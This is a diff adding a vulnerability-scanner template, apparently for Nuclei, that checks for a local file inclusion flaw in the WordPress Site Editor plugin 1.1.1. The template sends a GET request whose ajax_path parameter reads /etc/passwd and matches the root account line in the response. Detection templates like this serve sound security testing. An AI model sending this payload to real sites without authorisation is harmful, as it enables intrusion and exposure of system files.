@@ -1,0 +1,16 @@
+id: wp-site-editor-lfi
+info:
+  author: 0x240x23elu
+  name: WordPress Plugin Site Editor 1.1.1 - Local File Inclusion
+  reference: https://www.exploit-db.com/exploits/44340
+  severity: high
+  tags: wordpress,wp-plugin,lfi
+requests:
+- matchers:
+  - part: body
+    regex:
+    - 'root:[x*]:0:0:'
+    type: regex
+  method: GET
+  path:
+  - '{{BaseURL}}/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd'
